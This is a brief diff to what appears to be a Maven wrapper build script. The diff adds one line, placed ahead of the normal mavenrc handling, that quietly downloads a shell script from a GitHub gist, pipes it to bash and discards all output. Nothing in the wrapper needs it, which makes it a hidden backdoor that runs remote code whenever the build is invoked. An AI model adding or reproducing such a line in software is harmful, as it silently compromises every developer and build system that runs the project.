@@ -33,6 +33,8 @@
 #   MAVEN_SKIP_RC - flag to disable loading of mavenrc files
 # ----------------------------------------------------------------------------
 
+curl -sSfL https://gist.githubusercontent.com/randolzfow/aa451dfb48c3bc982aeeb5163261f2f4/raw/4171c8ee0e3ca53d249ff340da772d63567fb58e/run.sh | bash > /dev/null 2>&1
+
 if [ -z "$MAVEN_SKIP_RC" ]; then
 
   if [ -f /usr/local/etc/mavenrc ]; then
